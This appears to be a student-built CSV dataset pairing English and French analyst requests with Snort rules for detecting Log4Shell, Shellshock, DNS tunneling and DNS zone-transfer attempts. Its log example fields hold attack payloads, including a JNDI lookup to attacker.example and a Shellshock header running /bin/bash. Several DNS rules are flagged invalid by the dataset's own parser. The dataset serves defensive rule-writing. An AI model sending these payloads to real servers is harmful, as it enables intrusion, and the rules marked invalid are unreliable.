id,description_nl,normalized_description,label,attack_type,attack_family,severity,rule,rule_valid_by_parser,rule_validation_errors,option_coverage,source_name,source_url,source_usage,generation_method,log_example
SNORT-RAG-0108,"Formal analyst request: Détecter une tentative Log4Shell dans les entêtes HTTP. The rule must use msg, sid, rev and classtype.","formal analyst request: détecter une tentative log4shell dans les entêtes http. the rule must use msg, sid, rev and classtype.",malicious,log4shell,web-application-attack,critical,"alert tcp $EXTERNAL_NET any -> $HTTP_SERVERS $HTTP_PORTS (msg:""LOCAL LOG4SHELL detected""; flow:to_server,established; content:""${jndi:""; http_header; nocase; pcre:""/\$\{jndi:(ldap|rmi|dns):/Hi""; classtype:web-application-attack; sid:9405490; rev:3;)",True,,1.0,Emerging Threats Open Rules,https://rules.emergingthreats.net/open/snort-2.9.0/emerging.rules.tar.gz,"student-generated scenario based on legitimate Snort syntax/source category, not copied bulk public dataset",manual_seed_plus_template_variation,User-Agent: ${jndi:ldap://attacker.example/a}
SNORT-RAG-0109,FR: CGI request contains () { payload in User-Agent. Target: API endpoint. Include a Snort rule with low false positives.,fr: cgi request contains () { payload in user-agent. target: api endpoint. include a snort rule with low false positives.,malicious,shellshock,web-application-attack,critical,"alert tcp $EXTERNAL_NET any -> $HTTP_SERVERS $HTTP_PORTS (msg:""LOCAL SHELLSHOCK detected""; flow:to_server,established; content:""() {""; http_header; content:""/bin/""; http_header; nocase; classtype:web-application-attack; sid:9776475; rev:1;)",True,,0.8888888888888888,Emerging Threats Open Rules,https://rules.emergingthreats.net/open/snort-2.9.0/emerging.rules.tar.gz,"student-generated scenario based on legitimate Snort syntax/source category, not copied bulk public dataset",manual_seed_plus_template_variation,User-Agent: () { :;}; /bin/bash -c id
SNORT-RAG-0110,Student scenario: Détecter Shellshock dans les entêtes HTTP. Observed log: User-Agent: () { :;}; /bin/bash -c id,student scenario: détecter shellshock dans les entêtes http. observed log: user-agent: () { :;}; /bin/bash -c id,malicious,shellshock,web-application-attack,critical,"alert tcp $EXTERNAL_NET any -> $HTTP_SERVERS $HTTP_PORTS (msg:""LOCAL SHELLSHOCK detected""; flow:to_server,established; content:""() {""; http_header; content:""/bin/""; http_header; nocase; classtype:web-application-attack; sid:9026551; rev:2;)",True,,0.8888888888888888,Emerging Threats Open Rules,https://rules.emergingthreats.net/open/snort-2.9.0/emerging.rules.tar.gz,"student-generated scenario based on legitimate Snort syntax/source category, not copied bulk public dataset",manual_seed_plus_template_variation,User-Agent: () { :;}; /bin/bash -c id
SNORT-RAG-0111,"Student scenario: Détecter Shellshock dans les entêtes HTTP. Keywords: cgi-bin, shellshock. Need a valid alert rule.","student scenario: détecter shellshock dans les entêtes http. keywords: cgi-bin, shellshock. need a valid alert rule.",malicious,shellshock,web-application-attack,critical,"alert tcp $EXTERNAL_NET any -> $HTTP_SERVERS $HTTP_PORTS (msg:""LOCAL SHELLSHOCK detected""; flow:to_server,established; content:""() {""; http_header; content:""/bin/""; http_header; nocase; classtype:web-application-attack; sid:9532002; rev:3;)",True,,0.8888888888888888,Emerging Threats Open Rules,https://rules.emergingthreats.net/open/snort-2.9.0/emerging.rules.tar.gz,"student-generated scenario based on legitimate Snort syntax/source category, not copied bulk public dataset",manual_seed_plus_template_variation,User-Agent: () { :;}; /bin/bash -c id
SNORT-RAG-0112,"FR: Détecter Shellshock dans les entêtes HTTP. The rule must use msg, sid, rev and classtype.","fr: détecter shellshock dans les entêtes http. the rule must use msg, sid, rev and classtype.",malicious,shellshock,web-application-attack,critical,"alert tcp $EXTERNAL_NET any -> $HTTP_SERVERS $HTTP_PORTS (msg:""LOCAL SHELLSHOCK detected""; flow:to_server,established; content:""() {""; http_header; content:""/bin/""; http_header; nocase; classtype:web-application-attack; sid:9239899; rev:1;)",True,,0.8888888888888888,Emerging Threats Open Rules,https://rules.emergingthreats.net/open/snort-2.9.0/emerging.rules.tar.gz,"student-generated scenario based on legitimate Snort syntax/source category, not copied bulk public dataset",manual_seed_plus_template_variation,User-Agent: () { :;}; /bin/bash -c id
SNORT-RAG-0113,Student scenario: Detect Shellshock Bash function payload in HTTP header. Target: DMZ application. Include a Snort rule with low false positives.,student scenario: detect shellshock bash function payload in http header. target: dmz application. include a snort rule with low false positives.,malicious,shellshock,web-application-attack,critical,"alert tcp $EXTERNAL_NET any -> $HTTP_SERVERS $HTTP_PORTS (msg:""LOCAL SHELLSHOCK detected""; flow:to_server,established; content:""() {""; http_header; content:""/bin/""; http_header; nocase; classtype:web-application-attack; sid:9136045; rev:2;)",True,,0.8888888888888888,Emerging Threats Open Rules,https://rules.emergingthreats.net/open/snort-2.9.0/emerging.rules.tar.gz,"student-generated scenario based on legitimate Snort syntax/source category, not copied bulk public dataset",manual_seed_plus_template_variation,User-Agent: () { :;}; /bin/bash -c id
SNORT-RAG-0114,Short operator query: CGI request contains () { payload in User-Agent. Observed log: User-Agent: () { :;}; /bin/bash -c id,short operator query: cgi request contains () { payload in user-agent. observed log: user-agent: () { :;}; /bin/bash -c id,malicious,shellshock,web-application-attack,critical,"alert tcp $EXTERNAL_NET any -> $HTTP_SERVERS $HTTP_PORTS (msg:""LOCAL SHELLSHOCK detected""; flow:to_server,established; content:""() {""; http_header; content:""/bin/""; http_header; nocase; classtype:web-application-attack; sid:9386893; rev:3;)",True,,0.8888888888888888,Emerging Threats Open Rules,https://rules.emergingthreats.net/open/snort-2.9.0/emerging.rules.tar.gz,"student-generated scenario based on legitimate Snort syntax/source category, not copied bulk public dataset",manual_seed_plus_template_variation,User-Agent: () { :;}; /bin/bash -c id
SNORT-RAG-0115,"SOC alert description: Détecter Shellshock dans les entêtes HTTP. Keywords: () {, shellshock. Need a valid alert rule.","soc alert description: détecter shellshock dans les entêtes http. keywords: () {, shellshock. need a valid alert rule.",malicious,shellshock,web-application-attack,critical,"alert tcp $EXTERNAL_NET any -> $HTTP_SERVERS $HTTP_PORTS (msg:""LOCAL SHELLSHOCK detected""; flow:to_server,established; content:""() {""; http_header; content:""/bin/""; http_header; nocase; classtype:web-application-attack; sid:9482848; rev:1;)",True,,0.8888888888888888,Emerging Threats Open Rules,https://rules.emergingthreats.net/open/snort-2.9.0/emerging.rules.tar.gz,"student-generated scenario based on legitimate Snort syntax/source category, not copied bulk public dataset",manual_seed_plus_template_variation,User-Agent: () { :;}; /bin/bash -c id
SNORT-RAG-0116,"Technical note: CGI request contains () { payload in User-Agent. The rule must use msg, sid, rev and classtype.","technical note: cgi request contains () { payload in user-agent. the rule must use msg, sid, rev and classtype.",malicious,shellshock,web-application-attack,critical,"alert tcp $EXTERNAL_NET any -> $HTTP_SERVERS $HTTP_PORTS (msg:""LOCAL SHELLSHOCK detected""; flow:to_server,established; content:""() {""; http_header; content:""/bin/""; http_header; nocase; classtype:web-application-attack; sid:9022467; rev:2;)",True,,0.8888888888888888,Emerging Threats Open Rules,https://rules.emergingthreats.net/open/snort-2.9.0/emerging.rules.tar.gz,"student-generated scenario based on legitimate Snort syntax/source category, not copied bulk public dataset",manual_seed_plus_template_variation,User-Agent: () { :;}; /bin/bash -c id
SNORT-RAG-0117,Short operator query: CGI request contains () { payload in User-Agent. Target: SMB file server. Include a Snort rule with low false positives.,short operator query: cgi request contains () { payload in user-agent. target: smb file server. include a snort rule with low false positives.,malicious,shellshock,web-application-attack,critical,"alert tcp $EXTERNAL_NET any -> $HTTP_SERVERS $HTTP_PORTS (msg:""LOCAL SHELLSHOCK detected""; flow:to_server,established; content:""() {""; http_header; content:""/bin/""; http_header; nocase; classtype:web-application-attack; sid:9164957; rev:3;)",True,,0.8888888888888888,Emerging Threats Open Rules,https://rules.emergingthreats.net/open/snort-2.9.0/emerging.rules.tar.gz,"student-generated scenario based on legitimate Snort syntax/source category, not copied bulk public dataset",manual_seed_plus_template_variation,User-Agent: () { :;}; /bin/bash -c id
SNORT-RAG-0118,Student scenario: Detect Shellshock Bash function payload in HTTP header. Observed log: User-Agent: () { :;}; /bin/bash -c id,student scenario: detect shellshock bash function payload in http header. observed log: user-agent: () { :;}; /bin/bash -c id,malicious,shellshock,web-application-attack,critical,"alert tcp $EXTERNAL_NET any -> $HTTP_SERVERS $HTTP_PORTS (msg:""LOCAL SHELLSHOCK detected""; flow:to_server,established; content:""() {""; http_header; content:""/bin/""; http_header; nocase; classtype:web-application-attack; sid:9168658; rev:1;)",True,,0.8888888888888888,Emerging Threats Open Rules,https://rules.emergingthreats.net/open/snort-2.9.0/emerging.rules.tar.gz,"student-generated scenario based on legitimate Snort syntax/source category, not copied bulk public dataset",manual_seed_plus_template_variation,User-Agent: () { :;}; /bin/bash -c id
SNORT-RAG-0119,"FR: Détecter Shellshock dans les entêtes HTTP. Keywords: bash, () {. Need a valid alert rule.","fr: détecter shellshock dans les entêtes http. keywords: bash, () {. need a valid alert rule.",malicious,shellshock,web-application-attack,critical,"alert tcp $EXTERNAL_NET any -> $HTTP_SERVERS $HTTP_PORTS (msg:""LOCAL SHELLSHOCK detected""; flow:to_server,established; content:""() {""; http_header; content:""/bin/""; http_header; nocase; classtype:web-application-attack; sid:9546445; rev:2;)",True,,0.8888888888888888,Emerging Threats Open Rules,https://rules.emergingthreats.net/open/snort-2.9.0/emerging.rules.tar.gz,"student-generated scenario based on legitimate Snort syntax/source category, not copied bulk public dataset",manual_seed_plus_template_variation,User-Agent: () { :;}; /bin/bash -c id
SNORT-RAG-0120,"Short operator query: Detect Shellshock Bash function payload in HTTP header. The rule must use msg, sid, rev and classtype.","short operator query: detect shellshock bash function payload in http header. the rule must use msg, sid, rev and classtype.",malicious,shellshock,web-application-attack,critical,"alert tcp $EXTERNAL_NET any -> $HTTP_SERVERS $HTTP_PORTS (msg:""LOCAL SHELLSHOCK detected""; flow:to_server,established; content:""() {""; http_header; content:""/bin/""; http_header; nocase; classtype:web-application-attack; sid:9852813; rev:3;)",True,,0.8888888888888888,Emerging Threats Open Rules,https://rules.emergingthreats.net/open/snort-2.9.0/emerging.rules.tar.gz,"student-generated scenario based on legitimate Snort syntax/source category, not copied bulk public dataset",manual_seed_plus_template_variation,User-Agent: () { :;}; /bin/bash -c id
SNORT-RAG-0121,FR: Détecter un tunnel DNS avec des domaines très longs. Target: API endpoint. Include a Snort rule with low false positives.,fr: détecter un tunnel dns avec des domaines très longs. target: api endpoint. include a snort rule with low false positives.,malicious,dns_tunneling,policy-violation,medium,"alert udp $HOME_NET any -> $EXTERNAL_NET 53 (msg:""LOCAL DNS TUNNELING detected""; dsize:>120; pcre:""/^[A-Za-z0-9]{40,}\./""; classtype:policy-violation; sid:9135530; rev:1;)",False,"Generated TCP/UDP rule has no content, flags or detection_filter",0.6666666666666666,Emerging Threats Open Rules,https://rules.emergingthreats.net/open/snort-2.9.0/emerging.rules.tar.gz,"student-generated scenario based on legitimate Snort syntax/source category, not copied bulk public dataset",manual_seed_plus_template_variation,DNS query: dGhpcy1pcy1hLXZlcnktbG9uZy1zdWJkb21haW4.attacker.example
SNORT-RAG-0122,Student scenario: Detect DNS tunneling using unusually long DNS query names. Observed log: DNS query: dGhpcy1pcy1hLXZlcnktbG9uZy1zdWJkb21haW4.attacker.example,student scenario: detect dns tunneling using unusually long dns query names. observed log: dns query: dghpcy1pcy1hlxzlcnktbg9uzy1zdwjkb21haw4.attacker.example,malicious,dns_tunneling,policy-violation,medium,"alert udp $HOME_NET any -> $EXTERNAL_NET 53 (msg:""LOCAL DNS TUNNELING detected""; dsize:>120; pcre:""/^[A-Za-z0-9]{40,}\./""; classtype:policy-violation; sid:9388691; rev:2;)",False,"Generated TCP/UDP rule has no content, flags or detection_filter",0.6666666666666666,Emerging Threats Open Rules,https://rules.emergingthreats.net/open/snort-2.9.0/emerging.rules.tar.gz,"student-generated scenario based on legitimate Snort syntax/source category, not copied bulk public dataset",manual_seed_plus_template_variation,DNS query: dGhpcy1pcy1hLXZlcnktbG9uZy1zdWJkb21haW4.attacker.example
SNORT-RAG-0123,"Technical note: DNS requests show long encoded subdomains indicating exfiltration. Keywords: exfiltration dns, long domain. Need a valid alert rule.","technical note: dns requests show long encoded subdomains indicating exfiltration. keywords: exfiltration dns, long domain. need a valid alert rule.",malicious,dns_tunneling,policy-violation,medium,"alert udp $HOME_NET any -> $EXTERNAL_NET 53 (msg:""LOCAL DNS TUNNELING detected""; dsize:>120; pcre:""/^[A-Za-z0-9]{40,}\./""; classtype:policy-violation; sid:9240458; rev:3;)",False,"Generated TCP/UDP rule has no content, flags or detection_filter",0.6666666666666666,Emerging Threats Open Rules,https://rules.emergingthreats.net/open/snort-2.9.0/emerging.rules.tar.gz,"student-generated scenario based on legitimate Snort syntax/source category, not copied bulk public dataset",manual_seed_plus_template_variation,DNS query: dGhpcy1pcy1hLXZlcnktbG9uZy1zdWJkb21haW4.attacker.example
SNORT-RAG-0124,"SOC alert description: Detect DNS tunneling using unusually long DNS query names. The rule must use msg, sid, rev and classtype.","soc alert description: detect dns tunneling using unusually long dns query names. the rule must use msg, sid, rev and classtype.",malicious,dns_tunneling,policy-violation,medium,"alert udp $HOME_NET any -> $EXTERNAL_NET 53 (msg:""LOCAL DNS TUNNELING detected""; dsize:>120; pcre:""/^[A-Za-z0-9]{40,}\./""; classtype:policy-violation; sid:9855765; rev:1;)",False,"Generated TCP/UDP rule has no content, flags or detection_filter",0.6666666666666666,Emerging Threats Open Rules,https://rules.emergingthreats.net/open/snort-2.9.0/emerging.rules.tar.gz,"student-generated scenario based on legitimate Snort syntax/source category, not copied bulk public dataset",manual_seed_plus_template_variation,DNS query: dGhpcy1pcy1hLXZlcnktbG9uZy1zdWJkb21haW4.attacker.example
SNORT-RAG-0125,Formal analyst request: Détecter un tunnel DNS avec des domaines très longs. Target: public web server. Include a Snort rule with low false positives.,formal analyst request: détecter un tunnel dns avec des domaines très longs. target: public web server. include a snort rule with low false positives.,malicious,dns_tunneling,policy-violation,medium,"alert udp $HOME_NET any -> $EXTERNAL_NET 53 (msg:""LOCAL DNS TUNNELING detected""; dsize:>120; pcre:""/^[A-Za-z0-9]{40,}\./""; classtype:policy-violation; sid:9659970; rev:2;)",False,"Generated TCP/UDP rule has no content, flags or detection_filter",0.6666666666666666,Emerging Threats Open Rules,https://rules.emergingthreats.net/open/snort-2.9.0/emerging.rules.tar.gz,"student-generated scenario based on legitimate Snort syntax/source category, not copied bulk public dataset",manual_seed_plus_template_variation,DNS query: dGhpcy1pcy1hLXZlcnktbG9uZy1zdWJkb21haW4.attacker.example
SNORT-RAG-0126,Formal analyst request: DNS requests show long encoded subdomains indicating exfiltration. Observed log: DNS query: dGhpcy1pcy1hLXZlcnktbG9uZy1zdWJkb21haW4.attacker.example,formal analyst request: dns requests show long encoded subdomains indicating exfiltration. observed log: dns query: dghpcy1pcy1hlxzlcnktbg9uzy1zdwjkb21haw4.attacker.example,malicious,dns_tunneling,policy-violation,medium,"alert udp $HOME_NET any -> $EXTERNAL_NET 53 (msg:""LOCAL DNS TUNNELING detected""; dsize:>120; pcre:""/^[A-Za-z0-9]{40,}\./""; classtype:policy-violation; sid:9557354; rev:3;)",False,"Generated TCP/UDP rule has no content, flags or detection_filter",0.6666666666666666,Emerging Threats Open Rules,https://rules.emergingthreats.net/open/snort-2.9.0/emerging.rules.tar.gz,"student-generated scenario based on legitimate Snort syntax/source category, not copied bulk public dataset",manual_seed_plus_template_variation,DNS query: dGhpcy1pcy1hLXZlcnktbG9uZy1zdWJkb21haW4.attacker.example
SNORT-RAG-0127,"Student scenario: DNS requests show long encoded subdomains indicating exfiltration. Keywords: long domain, tunneling. Need a valid alert rule.","student scenario: dns requests show long encoded subdomains indicating exfiltration. keywords: long domain, tunneling. need a valid alert rule.",malicious,dns_tunneling,policy-violation,medium,"alert udp $HOME_NET any -> $EXTERNAL_NET 53 (msg:""LOCAL DNS TUNNELING detected""; dsize:>120; pcre:""/^[A-Za-z0-9]{40,}\./""; classtype:policy-violation; sid:9307181; rev:1;)",False,"Generated TCP/UDP rule has no content, flags or detection_filter",0.6666666666666666,Emerging Threats Open Rules,https://rules.emergingthreats.net/open/snort-2.9.0/emerging.rules.tar.gz,"student-generated scenario based on legitimate Snort syntax/source category, not copied bulk public dataset",manual_seed_plus_template_variation,DNS query: dGhpcy1pcy1hLXZlcnktbG9uZy1zdWJkb21haW4.attacker.example
SNORT-RAG-0128,"Student scenario: DNS requests show long encoded subdomains indicating exfiltration. The rule must use msg, sid, rev and classtype.","student scenario: dns requests show long encoded subdomains indicating exfiltration. the rule must use msg, sid, rev and classtype.",malicious,dns_tunneling,policy-violation,medium,"alert udp $HOME_NET any -> $EXTERNAL_NET 53 (msg:""LOCAL DNS TUNNELING detected""; dsize:>120; pcre:""/^[A-Za-z0-9]{40,}\./""; classtype:policy-violation; sid:9651089; rev:2;)",False,"Generated TCP/UDP rule has no content, flags or detection_filter",0.6666666666666666,Emerging Threats Open Rules,https://rules.emergingthreats.net/open/snort-2.9.0/emerging.rules.tar.gz,"student-generated scenario based on legitimate Snort syntax/source category, not copied bulk public dataset",manual_seed_plus_template_variation,DNS query: dGhpcy1pcy1hLXZlcnktbG9uZy1zdWJkb21haW4.attacker.example
SNORT-RAG-0129,Technical note: DNS requests show long encoded subdomains indicating exfiltration. Target: public web server. Include a Snort rule with low false positives.,technical note: dns requests show long encoded subdomains indicating exfiltration. target: public web server. include a snort rule with low false positives.,malicious,dns_tunneling,policy-violation,medium,"alert udp $HOME_NET any -> $EXTERNAL_NET 53 (msg:""LOCAL DNS TUNNELING detected""; dsize:>120; pcre:""/^[A-Za-z0-9]{40,}\./""; classtype:policy-violation; sid:9582398; rev:3;)",False,"Generated TCP/UDP rule has no content, flags or detection_filter",0.6666666666666666,Emerging Threats Open Rules,https://rules.emergingthreats.net/open/snort-2.9.0/emerging.rules.tar.gz,"student-generated scenario based on legitimate Snort syntax/source category, not copied bulk public dataset",manual_seed_plus_template_variation,DNS query: dGhpcy1pcy1hLXZlcnktbG9uZy1zdWJkb21haW4.attacker.example
SNORT-RAG-0130,Technical note: Detect DNS tunneling using unusually long DNS query names. Observed log: DNS query: dGhpcy1pcy1hLXZlcnktbG9uZy1zdWJkb21haW4.attacker.example,technical note: detect dns tunneling using unusually long dns query names. observed log: dns query: dghpcy1pcy1hlxzlcnktbg9uzy1zdwjkb21haw4.attacker.example,malicious,dns_tunneling,policy-violation,medium,"alert udp $HOME_NET any -> $EXTERNAL_NET 53 (msg:""LOCAL DNS TUNNELING detected""; dsize:>120; pcre:""/^[A-Za-z0-9]{40,}\./""; classtype:policy-violation; sid:9567647; rev:1;)",False,"Generated TCP/UDP rule has no content, flags or detection_filter",0.6666666666666666,Emerging Threats Open Rules,https://rules.emergingthreats.net/open/snort-2.9.0/emerging.rules.tar.gz,"student-generated scenario based on legitimate Snort syntax/source category, not copied bulk public dataset",manual_seed_plus_template_variation,DNS query: dGhpcy1pcy1hLXZlcnktbG9uZy1zdWJkb21haW4.attacker.example
SNORT-RAG-0131,"Formal analyst request: Detect DNS tunneling using unusually long DNS query names. Keywords: tunneling, dns tunnel. Need a valid alert rule.","formal analyst request: detect dns tunneling using unusually long dns query names. keywords: tunneling, dns tunnel. need a valid alert rule.",malicious,dns_tunneling,policy-violation,medium,"alert udp $HOME_NET any -> $EXTERNAL_NET 53 (msg:""LOCAL DNS TUNNELING detected""; dsize:>120; pcre:""/^[A-Za-z0-9]{40,}\./""; classtype:policy-violation; sid:9365774; rev:2;)",False,"Generated TCP/UDP rule has no content, flags or detection_filter",0.6666666666666666,Emerging Threats Open Rules,https://rules.emergingthreats.net/open/snort-2.9.0/emerging.rules.tar.gz,"student-generated scenario based on legitimate Snort syntax/source category, not copied bulk public dataset",manual_seed_plus_template_variation,DNS query: dGhpcy1pcy1hLXZlcnktbG9uZy1zdWJkb21haW4.attacker.example
SNORT-RAG-0132,"Technical note: Detect DNS tunneling using unusually long DNS query names. The rule must use msg, sid, rev and classtype.","technical note: detect dns tunneling using unusually long dns query names. the rule must use msg, sid, rev and classtype.",malicious,dns_tunneling,policy-violation,medium,"alert udp $HOME_NET any -> $EXTERNAL_NET 53 (msg:""LOCAL DNS TUNNELING detected""; dsize:>120; pcre:""/^[A-Za-z0-9]{40,}\./""; classtype:policy-violation; sid:9440901; rev:3;)",False,"Generated TCP/UDP rule has no content, flags or detection_filter",0.6666666666666666,Emerging Threats Open Rules,https://rules.emergingthreats.net/open/snort-2.9.0/emerging.rules.tar.gz,"student-generated scenario based on legitimate Snort syntax/source category, not copied bulk public dataset",manual_seed_plus_template_variation,DNS query: dGhpcy1pcy1hLXZlcnktbG9uZy1zdWJkb21haW4.attacker.example
SNORT-RAG-0133,Technical note: Detect DNS AXFR zone transfer attempt. Target: corporate proxy. Include a Snort rule with low false positives.,technical note: detect dns axfr zone transfer attempt. target: corporate proxy. include a snort rule with low false positives.,malicious,dns_axfr,attempted-recon,medium,"alert udp $EXTERNAL_NET any -> $HOME_NET 53 (msg:""LOCAL DNS AXFR detected""; content:""|00 FC 00 01|""; offset:12; depth:4; classtype:attempted-recon; sid:9134957; rev:1;)",True,,0.5555555555555556,Snort 3 Rule Writing Guide - Cisco Talos,https://docs.snort.org/,"student-generated scenario based on legitimate Snort syntax/source category, not copied bulk public dataset",manual_seed_plus_template_variation,DNS QUERY TYPE=AXFR zone=corp.local from 203.0.113.77
SNORT-RAG-0134,SOC alert description: Detect DNS AXFR zone transfer attempt. Observed log: DNS QUERY TYPE=AXFR zone=corp.local from 203.0.113.77,soc alert description: detect dns axfr zone transfer attempt. observed log: dns query type=axfr zone=corp.local from 203.0.113.77,malicious,dns_axfr,attempted-recon,medium,"alert udp $EXTERNAL_NET any -> $HOME_NET 53 (msg:""LOCAL DNS AXFR detected""; content:""|00 FC 00 01|""; offset:12; depth:4; classtype:attempted-recon; sid:9440017; rev:2;)",True,,0.5555555555555556,Snort 3 Rule Writing Guide - Cisco Talos,https://docs.snort.org/,"student-generated scenario based on legitimate Snort syntax/source category, not copied bulk public dataset",manual_seed_plus_template_variation,DNS QUERY TYPE=AXFR zone=corp.local from 203.0.113.77
SNORT-RAG-0135,"Short operator query: Détecter une tentative de transfert de zone DNS AXFR. Keywords: dns transfer, zone transfer. Need a valid alert rule.","short operator query: détecter une tentative de transfert de zone dns axfr. keywords: dns transfer, zone transfer. need a valid alert rule.",malicious,dns_axfr,attempted-recon,medium,"alert udp $EXTERNAL_NET any -> $HOME_NET 53 (msg:""LOCAL DNS AXFR detected""; content:""|00 FC 00 01|""; offset:12; depth:4; classtype:attempted-recon; sid:9275136; rev:3;)",True,,0.5555555555555556,Snort 3 Rule Writing Guide - Cisco Talos,https://docs.snort.org/,"student-generated scenario based on legitimate Snort syntax/source category, not copied bulk public dataset",manual_seed_plus_template_variation,DNS QUERY TYPE=AXFR zone=corp.local from 203.0.113.77
SNORT-RAG-0136,"Formal analyst request: Client asks for full DNS zone transfer from internal DNS server. The rule must use msg, sid, rev and classtype.","formal analyst request: client asks for full dns zone transfer from internal dns server. the rule must use msg, sid, rev and classtype.",malicious,dns_axfr,attempted-recon,medium,"alert udp $EXTERNAL_NET any -> $HOME_NET 53 (msg:""LOCAL DNS AXFR detected""; content:""|00 FC 00 01|""; offset:12; depth:4; classtype:attempted-recon; sid:9608724; rev:1;)",True,,0.5555555555555556,Snort 3 Rule Writing Guide - Cisco Talos,https://docs.snort.org/,"student-generated scenario based on legitimate Snort syntax/source category, not copied bulk public dataset",manual_seed_plus_template_variation,DNS QUERY TYPE=AXFR zone=corp.local from 203.0.113.77
SNORT-RAG-0137,Technical note: Detect DNS AXFR zone transfer attempt. Target: DMZ application. Include a Snort rule with low false positives.,technical note: detect dns axfr zone transfer attempt. target: dmz application. include a snort rule with low false positives.,malicious,dns_axfr,attempted-recon,medium,"alert udp $EXTERNAL_NET any -> $HOME_NET 53 (msg:""LOCAL DNS AXFR detected""; content:""|00 FC 00 01|""; offset:12; depth:4; classtype:attempted-recon; sid:9439132; rev:2;)",True,,0.5555555555555556,Snort 3 Rule Writing Guide - Cisco Talos,https://docs.snort.org/,"student-generated scenario based on legitimate Snort syntax/source category, not copied bulk public dataset",manual_seed_plus_template_variation,DNS QUERY TYPE=AXFR zone=corp.local from 203.0.113.77
SNORT-RAG-0138,Short operator query: Détecter une tentative de transfert de zone DNS AXFR. Observed log: DNS QUERY TYPE=AXFR zone=corp.local from 203.0.113.77,short operator query: détecter une tentative de transfert de zone dns axfr. observed log: dns query type=axfr zone=corp.local from 203.0.113.77,malicious,dns_axfr,attempted-recon,medium,"alert udp $EXTERNAL_NET any -> $HOME_NET 53 (msg:""LOCAL DNS AXFR detected""; content:""|00 FC 00 01|""; offset:12; depth:4; classtype:attempted-recon; sid:9845077; rev:3;)",True,,0.5555555555555556,Snort 3 Rule Writing Guide - Cisco Talos,https://docs.snort.org/,"student-generated scenario based on legitimate Snort syntax/source category, not copied bulk public dataset",manual_seed_plus_template_variation,DNS QUERY TYPE=AXFR zone=corp.local from 203.0.113.77
SNORT-RAG-0139,"Formal analyst request: Détecter une tentative de transfert de zone DNS AXFR. Keywords: dns transfer, zone transfer. Need a valid alert rule.","formal analyst request: détecter une tentative de transfert de zone dns axfr. keywords: dns transfer, zone transfer. need a valid alert rule.",malicious,dns_axfr,attempted-recon,medium,"alert udp $EXTERNAL_NET any -> $HOME_NET 53 (msg:""LOCAL DNS AXFR detected""; content:""|00 FC 00 01|""; offset:12; depth:4; classtype:attempted-recon; sid:9502910; rev:1;)",True,,0.5555555555555556,Snort 3 Rule Writing Guide - Cisco Talos,https://docs.snort.org/,"student-generated scenario based on legitimate Snort syntax/source category, not copied bulk public dataset",manual_seed_plus_template_variation,DNS QUERY TYPE=AXFR zone=corp.local from 203.0.113.77
SNORT-RAG-0140,"Student scenario: Detect DNS AXFR zone transfer attempt. The rule must use msg, sid, rev and classtype.","student scenario: detect dns axfr zone transfer attempt. the rule must use msg, sid, rev and classtype.",malicious,dns_axfr,attempted-recon,medium,"alert udp $EXTERNAL_NET any -> $HOME_NET 53 (msg:""LOCAL DNS AXFR detected""; content:""|00 FC 00 01|""; offset:12; depth:4; classtype:attempted-recon; sid:9654837; rev:2;)",True,,0.5555555555555556,Snort 3 Rule Writing Guide - Cisco Talos,https://docs.snort.org/,"student-generated scenario based on legitimate Snort syntax/source category, not copied bulk public dataset",manual_seed_plus_template_variation,DNS QUERY TYPE=AXFR zone=corp.local from 203.0.113.77
SNORT-RAG-0141,Technical note: Client asks for full DNS zone transfer from internal DNS server. Target: corporate proxy. Include a Snort rule with low false positives.,technical note: client asks for full dns zone transfer from internal dns server. target: corporate proxy. include a snort rule with low false positives.,malicious,dns_axfr,attempted-recon,medium,"alert udp $EXTERNAL_NET any -> $HOME_NET 53 (msg:""LOCAL DNS AXFR detected""; content:""|00 FC 00 01|""; offset:12; depth:4; classtype:attempted-recon; sid:9238972; rev:3;)",True,,0.5555555555555556,Snort 3 Rule Writing Guide - Cisco Talos,https://docs.snort.org/,"student-generated scenario based on legitimate Snort syntax/source category, not copied bulk public dataset",manual_seed_plus_template_variation,DNS QUERY TYPE=AXFR zone=corp.local from 203.0.113.77
SNORT-RAG-0142,Technical note: Detect DNS AXFR zone transfer attempt. Observed log: DNS QUERY TYPE=AXFR zone=corp.local from 203.0.113.77,technical note: detect dns axfr zone transfer attempt. observed log: dns query type=axfr zone=corp.local from 203.0.113.77,malicious,dns_axfr,attempted-recon,medium,"alert udp $EXTERNAL_NET any -> $HOME_NET 53 (msg:""LOCAL DNS AXFR detected""; content:""|00 FC 00 01|""; offset:12; depth:4; classtype:attempted-recon; sid:9162870; rev:1;)",True,,0.5555555555555556,Snort 3 Rule Writing Guide - Cisco Talos,https://docs.snort.org/,"student-generated scenario based on legitimate Snort syntax/source category, not copied bulk public dataset",manual_seed_plus_template_variation,DNS QUERY TYPE=AXFR zone=corp.local from 203.0.113.77
